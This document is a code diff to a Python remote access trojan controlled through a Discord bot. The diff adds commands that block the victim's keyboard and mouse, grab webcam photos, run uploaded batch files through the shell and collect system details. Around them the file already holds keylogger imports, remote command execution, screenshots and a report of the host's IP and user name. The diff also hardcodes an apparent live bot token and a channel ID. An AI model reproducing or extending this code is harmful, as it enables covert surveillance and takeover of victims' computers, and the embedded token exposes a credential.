@@ -1,5 +1,7 @@
+'MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'
 import webbrowser
 import os
+import cv2
 import logging
 import threading
 from pynput.keyboard import Listener
@@ -7,9 +9,12 @@ import getpass
 import discord
 import random
 import asyncio
+import ctypes
 import socket
 import pyautogui
+from ctypes import wintypes
 import psutil
+import platform
 import requests
 import subprocess
 from discord.ext import commands
@@ -41,7 +46,7 @@ async def on_command_error(ctx, error):
 @DisFunc.event
 async def on_ready():
     hostname = socket.gethostname()
-    channel = DisFunc.get_channel(your channel id)  # Replace with your desired channel ID 
+    channel = DisFunc.get_channel(1114220282614390788)  # Replace with your desired channel ID 
     user = getpass.getuser()
     ip = GetIP()
 
@@ -61,6 +66,67 @@ async def on_ready():
 
 
 
+@DisFunc.command()
+async def blockinput(ctx):
+    BlockInput = ctypes.windll.user32.BlockInput
+    BlockInput.argtypes = [wintypes.BOOL]
+    BlockInput.restype = wintypes.BOOL
+
+    blocked = BlockInput(True)
+    if blocked:
+        print("Input blocked.")
+    else:
+        print("Input is already blocked by another thread.")
+
+
+@DisFunc.command()
+async def unblockinput(ctx):
+    BlockInput = ctypes.windll.user32.BlockInput
+    BlockInput.argtypes = [wintypes.BOOL]
+    BlockInput.restype = wintypes.BOOL
+
+    blocked = BlockInput(False)
+    if not blocked:
+        await ctx.send("Input unblocked.")
+    else:
+        await ctx.send("Failed to unblock input.")
+
+
+
+
+
+
+
+
+@DisFunc.command()
+async def webcam(ctx):
+    cap = cv2.VideoCapture(0)  # Open webcam capture
+
+    if not cap.isOpened():
+        await ctx.send("Failed to open the webcam.")
+        return
+
+    ret, frame = cap.read()  # Read a frame from the webcam
+
+    if not ret:
+        await ctx.send("Failed to capture a frame from the webcam.")
+        return
+
+    # Save the frame as an image file
+    output = "webcam.jpg"
+    cv2.imwrite(output, frame)
+
+    # Send the image file to the channel
+    await ctx.send(file=discord.File(output))
+
+    # Clean up
+    cap.release()
+    cv2.destroyAllWindows()
+
+
+
+
+
 
 @DisFunc.command()
 async def cmd(ctx, *, cmds):
@@ -71,6 +137,7 @@ async def cmd(ctx, *, cmds):
         await ctx.send(f"```{output}```")
     except subprocess.CalledProcessError as e:
         await ctx.send(f"Command failed with exit code {e.returncode}\nError: {e.output}")
+
 
 
 
@@ -175,28 +242,76 @@ async def help(ctx):
     embed.add_field(name="?website <url>", value="Sends the user to a website of choice", inline=False)
     embed.add_field(name="?execpy <python command>", value="Execute a Python command provided by the user", inline=False)
     embed.add_field(name="?execpyfile", value="Execute a .py file provided by the user", inline=False)
-    embed.add_field(name="?exec <executable file>", value="Execute an executable file provided by the user", inline=False)
+    embed.add_field(name="?execbat <executable .bat file>", value="Execute an bat file provided by the user", inline=False)
+    embed.add_field(name="?sysinfo", value="Show system info", inline=False)
+    embed.add_field(name="?webcam", value="capture a webcam image", inline=False)
+    embed.add_field(name="?unblockinput", value="unblock input", inline=False)
+    embed.add_field(name="?blockinput ", value="blocks mouse keyboard everthing", inline=False)
 
     embed.set_footer(text="Credit to: https://github.com/syntheticlol")
 
     await ctx.send(embed=embed)
 
 
+
 @DisFunc.command()
-async def exec(ctx):
-    attachment = ctx.message.attachments[0]  # Get the first attachment from the message
+async def execbat(ctx):
+    attachments = ctx.message.attachments
+    if not attachments:
+        await ctx.send('No file attached.')
+        return
 
-    if attachment.filename.endswith(".exe"):  # Check if the attachment has a .exe extension
-        try:
-            file_path = f"temp/{attachment.filename}"  # Define the file path where the attachment will be saved
-            await attachment.save(file_path)  # Save the attachment to the specified file path
+    attachment = attachments[0]
+    if not attachment.filename.endswith('.bat'):
+        await ctx.send('Invalid file format. Only .bat files are supported.')
+        return
 
-            subprocess.Popen(file_path)  # Execute the .exe file using subprocess
-            await ctx.send(f"Executed `{attachment.filename}` successfully.")
-        except Exception as e:
-            await ctx.send(f"An error occurred while executing `{attachment.filename}`:\n```{e}```")
-    else:
-        await ctx.send("The attached file must be an executable (.exe) file.")
+    file_path = attachment.filename
+    try:
+        await attachment.save(file_path)
+        result = subprocess.run(file_path, capture_output=True, text=True, shell=True)
+        output = result.stdout if result.stdout else result.stderr
+        await ctx.send(f'Command executed:\n```{output}```')
+    except Exception as e:
+        await ctx.send(f'An error occurred while executing the command:\n```{str(e)}```')
+    finally:
+        # Delete the file after execution
+        subprocess.run(f'del {file_path}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+
+
+
+@DisFunc.command()
+async def sysinfo(ctx):
+    # Get system information using platform module
+    system_info = platform.uname()
+
+    # Get CPU usage percentage
+    cpu_usage = psutil.cpu_percent()
+
+    # Get memory usage
+    memory = psutil.virtual_memory()
+    total_memory = round(memory.total / (1024 ** 3), 2)
+    used_memory = round(memory.used / (1024 ** 3), 2)
+    memory_usage = memory.percent
+
+    # Create an embed message with system information
+    embed = discord.Embed(title="System Information", color=discord.Color.blue())
+    embed.add_field(name="System", value=f"```{system_info.system}```", inline=False)
+    embed.add_field(name="Node Name", value=f"```{system_info.node}```", inline=True)
+    embed.add_field(name="Release", value=f"```{system_info.release}```", inline=True)
+    embed.add_field(name="Version", value=f"```{system_info.version}```", inline=True)
+    embed.add_field(name="Machine", value=f"```{system_info.machine}```", inline=True)
+    embed.add_field(name="Processor", value=f"```{system_info.processor}```", inline=True)
+    embed.add_field(name="CPU Usage", value=f"```{cpu_usage}%```", inline=False)
+    embed.add_field(name="Memory Usage", value=f"```{used_memory} GB / {total_memory} GB ({memory_usage}%)```", inline=False)
+
+    await ctx.send(embed=embed)
+
+
+
+
 
 
 
@@ -334,7 +449,7 @@ async def screenshot(ctx):
         await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")
 
 # Replace with your bot token
-loop.create_task(DisFunc.start('your bot token here'))
+loop.create_task(DisFunc.start('MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'))
 
 try:
     loop.run_forever()
